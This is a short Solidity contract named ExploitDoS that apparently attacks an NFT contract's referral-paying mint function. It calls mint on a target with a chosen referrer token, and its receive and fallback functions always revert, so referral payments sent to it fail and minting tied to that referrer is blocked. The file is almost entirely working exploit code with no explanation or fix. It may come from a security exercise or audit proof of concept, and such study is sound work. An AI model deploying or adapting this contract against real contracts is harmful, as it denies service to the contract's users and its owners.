// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface IMandala {
  function mint(uint256 tokenIdReferrer, string memory detail) external payable;
}

contract ExploitDoS  is IERC721Receiver {
  
  function hack(address target, uint256 tokenReferrer) external payable{
    target.call{value: msg.value}(abi.encodeWithSignature("mint(uint256,string)", tokenReferrer,"DoS exploit"));
    // target.call{value: msg.value}(abi.encodeWithSelector(bytes4(keccak256("mint(uint256,string)")), tokenReferrer,"DoS exploit"));
  }

  function hack2(address target, uint256 tokenReferrer) external payable{
    IMandala(target).mint{value: msg.value}(tokenReferrer,"DoS exploit");
    // target.call{value: msg.value}(abi.encodeWithSelector(bytes4(keccak256("mint(uint256,string)")), tokenReferrer,"DoS exploit"));
  }

  receive() external payable{
    revert();
  }
  
  fallback() external {
    revert();
  }
  /**
    * Always returns `IERC721Receiver.onERC721Received.selector`.
    */
  function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
      return this.onERC721Received.selector;
  }
}

